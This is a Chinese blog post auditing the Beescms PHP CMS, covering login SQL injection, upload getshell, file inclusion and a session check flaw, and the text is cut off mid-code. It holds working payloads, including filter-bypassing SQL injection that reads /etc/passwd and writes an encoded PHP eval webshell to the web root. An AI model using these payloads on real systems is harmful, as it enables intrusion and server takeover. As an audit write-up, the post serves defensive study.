<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>【PHP代码审计】Beescms代码审计 | Lusen的小窝</title><meta name="author" content="Lusen"><meta name="copyright" content="Lusen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="【PHP代码审计】Beescms代码审计">
<meta property="og:type" content="article">
<meta property="og:title" content="【PHP代码审计】Beescms代码审计">
<meta property="og:url" content="http://example.com/2024/07/24/Code-Audit-PHP-Beescms/index.html">
<meta property="og:site_name" content="Lusen的小窝">
<meta property="og:description" content="【PHP代码审计】Beescms代码审计">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/img/42.jpg">
<meta property="article:published_time" content="2024-07-23T16:29:42.000Z">
<meta property="article:modified_time" content="2024-10-22T15:59:40.575Z">
<meta property="article:author" content="Lusen">
<meta property="article:tag" content="代码审计">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/img/42.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/07/24/Code-Audit-PHP-Beescms/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '【PHP代码审计】Beescms代码审计',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-10-22 23:59:40'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/background.css"><link rel="stylesheet" href="/css/mouse.css"><meta name="generator" content="Hexo 7.2.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/friend_404.gif" data-original="/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">97</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">48</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">16</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%BA%A2%E9%98%9F%E5%85%A5%E4%BE%B5/"><i class="fa-fw fas fa-folder-open"></i><span> 红队入侵</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5/"><i class="fa-fw fas fa-folder-open"></i><span> 蓝队应急</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/"><i class="fa-fw fas fa-folder-open"></i><span> 复现与审计</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Python%E6%AD%A6%E5%99%A8%E5%BA%93/"><i class="fa-fw fas fa-folder-open"></i><span> Python武器库</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%93%E6%A0%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 免杀专栏</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 靶场系列</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Vulnhub%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulnhub系列靶场</span></a></li><li><a class="site-page child" href="/categories/OSCP%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> OSCP系列靶场</span></a></li><li><a class="site-page child" href="/categories/Vulfocus%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulfocus系列靶场</span></a></li><li><a class="site-page child" href="/categories/%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 应急靶场</span></a></li><li><a class="site-page child" href="/categories/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 玄机应急靶场</span></a></li><li><a class="site-page child" href="/categories/Hackthebox%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Hackthebox系列靶场</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/CTF%E7%AB%9E%E8%B5%9B/"><i class="fa-fw fas fa-folder-open"></i><span> CTF竞赛</span></a></li><li><a class="site-page child" href="/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"><i class="fa-fw fas fa-folder-open"></i><span> 漏洞扫描器</span></a></li><li><a class="site-page child" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-fw fas fa-folder-open"></i><span> 基础知识</span></a></li><li><a class="site-page child" href="/categories/%E5%85%B6%E4%BB%96%E7%BB%8F%E9%AA%8C/"><i class="fa-fw fas fa-folder-open"></i><span> 其他经验</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/42.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Lusen的小窝"><span class="site-name">Lusen的小窝</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E7%BA%A2%E9%98%9F%E5%85%A5%E4%BE%B5/"><i class="fa-fw fas fa-folder-open"></i><span> 红队入侵</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5/"><i class="fa-fw fas fa-folder-open"></i><span> 蓝队应急</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/"><i class="fa-fw fas fa-folder-open"></i><span> 复现与审计</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 内网渗透</span></a></div><div class="menus_item"><a class="site-page" href="/categories/Python%E6%AD%A6%E5%99%A8%E5%BA%93/"><i class="fa-fw fas fa-folder-open"></i><span> Python武器库</span></a></div><div class="menus_item"><a class="site-page" href="/categories/%E5%85%8D%E6%9D%80%E4%B8%93%E6%A0%8F/"><i class="fa-fw fas fa-folder-open"></i><span> 免杀专栏</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 靶场系列</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/Vulnhub%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulnhub系列靶场</span></a></li><li><a class="site-page child" href="/categories/OSCP%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> OSCP系列靶场</span></a></li><li><a class="site-page child" href="/categories/Vulfocus%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Vulfocus系列靶场</span></a></li><li><a class="site-page child" href="/categories/%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 应急靶场</span></a></li><li><a class="site-page child" href="/categories/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> 玄机应急靶场</span></a></li><li><a class="site-page child" href="/categories/Hackthebox%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA/"><i class="fa-fw fas fa-folder-open"></i><span> Hackthebox系列靶场</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 其他</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/categories/CTF%E7%AB%9E%E8%B5%9B/"><i class="fa-fw fas fa-folder-open"></i><span> CTF竞赛</span></a></li><li><a class="site-page child" href="/categories/%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E5%99%A8/"><i class="fa-fw fas fa-folder-open"></i><span> 漏洞扫描器</span></a></li><li><a class="site-page child" href="/categories/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fa-fw fas fa-folder-open"></i><span> 基础知识</span></a></li><li><a class="site-page child" href="/categories/%E5%85%B6%E4%BB%96%E7%BB%8F%E9%AA%8C/"><i class="fa-fw fas fa-folder-open"></i><span> 其他经验</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">【PHP代码审计】Beescms代码审计</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-07-23T16:29:42.000Z" title="发表于 2024-07-24 00:29:42">2024-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-10-22T15:59:40.575Z" title="更新于 2024-10-22 23:59:40">2024-10-22</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AE%A1%E8%AE%A1/">复现与审计</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.7k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="【PHP代码审计】Beescms代码审计"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>前几天在nssctf 参加了awd 赛事，使用的靶场就是Beescms，赛事过后对这个靶场多了一点理解，趁热打铁，分析一下beescms 漏洞造成的原因</p>
<h1 id="二、后台登陆SQL注入漏洞"><a href="#二、后台登陆SQL注入漏洞" class="headerlink" title="二、后台登陆SQL注入漏洞"></a>二、后台登陆SQL注入漏洞</h1><p>漏洞代码位置在<code>admin/login.php</code>文件中</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241021235458049.png" alt="image-20241021235458049"></p>
<p>而真正实现登陆查询的操作在<code>includes/fun.php</code>的<code>check_login</code> 函数，我们来观察这个函数的主要代码部分：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rel</span> = <span class="variable">$GLOBALS</span>[<span class="string">&#x27;mysql&#x27;</span>]-&gt;<span class="title function_ invoke__">fetch_asc</span>(<span class="string">&quot;select id,admin_name,admin_password,admin_purview,is_disable from &quot;</span> . DB_PRE . <span class="string">&quot;admin where admin_name=&#x27;&quot;</span> . <span class="variable">$user</span> . <span class="string">&quot;&#x27; limit 0,1&quot;</span>);</span><br><span class="line"><span class="variable">$rel</span> = <span class="keyword">empty</span>(<span class="variable">$rel</span>) ? <span class="string">&#x27;&#x27;</span> : <span class="variable">$rel</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$rel</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;不存在该管理用户&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$password</span> != <span class="variable">$rel</span>[<span class="string">&#x27;admin_password&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&quot;输入的密码不正确&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$rel</span>[<span class="string">&#x27;is_disable&#x27;</span>]) &#123;</span><br><span class="line">    <span class="title function_ invoke__">msg</span>(<span class="string">&#x27;该账号已经被锁定,无法登陆&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 则登陆成功</span></span><br></pre></td></tr></table></figure>

<p>可以看到，我们传入的用户名直接拼接在SQL语句中，造成SQL注入；当然，光这里是不够的，我们发现，在后端接收账号密码的时候就利用函数进行了过滤</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$user</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]));</span><br><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">fl_html</span>(<span class="title function_ invoke__">fl_value</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]));</span><br></pre></td></tr></table></figure>

<p>我们先看下<code>fl_value</code> 函数：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_value</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$str</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select|insert | update | and | in | on | left | joins | delete |\%|\=|\/\*|\*|\.\.\/|\.\/| union | from | where | group | into |load_file |outfile/i&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先判断了用户名是否为空，然后对其中的<code>select</code>等字符替换为空，这个地方我们可以用双写绕过</p>
<p>再看<code>fl_html</code>函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fl_html</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数用<code>htmlspecialchars</code> 将用户名进行html实体转换，但是，他这个写法有丢丢缺陷，如下：</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022000854070.png" alt="image-20241022000854070"></p>
<p>就是说，这里并没有过滤单引号’，导致被绕过</p>
<p>payload如下：</p>
<p>1’ a and nd extractvalue(1,concat(0x7e,(select user()),0x7e))#</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022001524357.png" alt="image-20241022001524357"></p>
<p>其他利用如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1、读取文件：</span></span><br><span class="line">admin<span class="string">&#x27; a and nd extractvalue(1,concat(0x7e,(select load_file(&#x27;</span>/etc/passwd<span class="string">&#x27;)),0x7e))#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">// 2、写入webshell</span></span><br><span class="line"><span class="string">admin&#x27;</span> uni union on selselectect <span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="literal">null</span>,<span class="number">0x3c3f70687020406576616c28245f504f53545b636d645d293b3f3e</span>  in into  outoutfilefile <span class="string">&#x27;/var/www/html/index_backup.php&#x27;</span><span class="comment">#</span></span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">admin<span class="string">&#x27; uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 64, 101, 118, 97, 108, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile &#x27;</span>C:/phpStudy/WWW/beescms/cmd.php<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>

<h1 id="三、后台文件上传Getshell"><a href="#三、后台文件上传Getshell" class="headerlink" title="三、后台文件上传Getshell"></a>三、后台文件上传Getshell</h1><p>来后台添加文章模块中上传图片</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022001903887.png" alt="image-20241022001903887"></p>
<p>在BP中看到传递的链接地址在<code>/admin/admin_pic_upload.php?type=radio&amp;get=thumb</code></p>
<p>查看关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$value_arr</span> = <span class="title function_ invoke__">up_img</span>(<span class="variable">$pic_info</span>,<span class="variable">$is_up_size</span>,<span class="keyword">array</span>(<span class="string">&#x27;image/gif&#x27;</span>,<span class="string">&#x27;image/jpeg&#x27;</span>,<span class="string">&#x27;image/png&#x27;</span>,<span class="string">&#x27;image/jpg&#x27;</span>,<span class="string">&#x27;image/bmp&#x27;</span>,<span class="string">&#x27;image/pjpeg&#x27;</span>,<span class="string">&#x27;image/x-png&#x27;</span>),<span class="variable">$up_is_thumb</span>,<span class="variable">$up_thumb_width</span>,<span class="variable">$up_thumb_height</span>,<span class="variable">$logo</span>=<span class="number">1</span>,<span class="variable">$pic_name_alt</span>);</span><br></pre></td></tr></table></figure>

<p>可以看到在后端似乎仅仅做了MIME检测，这个是很好绕过的，在<code>up_img</code> 函数中也仅仅限制了大小和判断了MIME 格式，但是有一个点是会重命名文件：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$up_file_name</span> = <span class="keyword">empty</span>(<span class="variable">$pic_alt</span>) ? <span class="title function_ invoke__">date</span>(<span class="string">&#x27;YmdHis&#x27;</span>) . <span class="title function_ invoke__">rand</span>(<span class="number">1</span>, <span class="number">10000</span>) : <span class="variable">$pic_alt</span>;</span><br></pre></td></tr></table></figure>

<p>我们需要去拿文件，然后跟上php即可连接shell</p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022004613854.png" alt="image-20241022004613854"></p>
<h1 id="四、任意PHP文件包含漏洞"><a href="#四、任意PHP文件包含漏洞" class="headerlink" title="四、任意PHP文件包含漏洞"></a>四、任意PHP文件包含漏洞</h1><p>漏洞点：<code>admin/admin_channel.php</code></p>
<p><img src="/img/friend_404.gif" data-original="/img/Code-Audit-PHP-Beescms/image-20241022223611872.png" alt="image-20241022223611872"></p>
<p>由于校验不严格导致可以利用..&#x2F;包含任意php文件</p>
<p>这个漏洞稍有点鸡肋，你都登陆后台了，还差包含他这个php吗</p>
<h1 id="五、水平越权漏洞"><a href="#五、水平越权漏洞" class="headerlink" title="五、水平越权漏洞"></a>五、水平越权漏洞</h1><p>在访问<code>admin/admin.php</code>的代码中包含了<code>init.php</code>文件，这个文件中实现了判断是否是管理员的登陆状态，如下关键代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查登陆</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_login</span>())&#123;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;location:login.php&#x27;</span>);<span class="keyword">exit</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>那么实现检查的代码在<code>is_login()</code>函数中，查看逻辑</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">is_login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] == <span class="number">1</span> &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>]) &#123; <span class="comment">// 判断session中login_in 是否为1以及admin是否有值</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">time</span>() - <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] &gt; <span class="number">3600</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">login_out</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="title function_ invoke__">time</span>();</span><br><span class="line">            @<span class="title function_ invoke__">session_regenerate_id</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_purview&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_id&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_in&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;login_time&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;admin_ip&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这段代码本身的逻辑是不存在问题的，问题出在其他的很多地方引用了这个逻辑，比如有这样一个文件，<code>includes/init.php</code>，关键代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line">......</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>))&#123;<span class="variable">$_REQUEST</span>  = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_REQUEST</span>);&#125;</span><br><span class="line">    <span class="variable">$_COOKIE</span>   = <span class="title function_ invoke__">fl_value</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">	<span class="variable">$_GET</span> = <span class="title function_ 